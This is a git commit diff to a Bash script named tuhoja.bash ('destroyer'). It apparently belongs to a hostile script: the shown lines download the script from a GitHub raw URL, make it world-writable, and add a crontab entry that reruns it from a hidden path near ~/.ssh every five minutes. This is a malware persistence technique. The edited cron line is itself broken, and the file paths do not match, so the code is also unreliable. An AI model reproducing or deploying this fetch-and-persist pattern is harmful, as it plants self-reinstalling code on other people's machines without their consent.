5013abdade95511ad4fab7265620027e6351bb01
Poliisi5 <hermannipinomaki@gmail.com>
2025-01-13 14:19:59 +0200

    Maybe fixed cron

--- tuhoja.bash
+++ tuhoja.bash
@@ -20,5 +20,5 @@ if test -f $PERSISTENCE_DIR ; then
 else
   curl -o $PERSISTENCE_DIR https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/tuhoja.bash
   chmod 777 $PERSISTENCE_DIR
-  (crontab -l 2>/dev/null || true; echo "*/5 * * * * /bin/bash ~.ssh/tuhoja.sh") | crontab -
+  (crontab -l 2>/dev/null || true; echo "/5 * * * * /bin/bash ~.ssh/tuhoja.sh") | crontab -
 fi
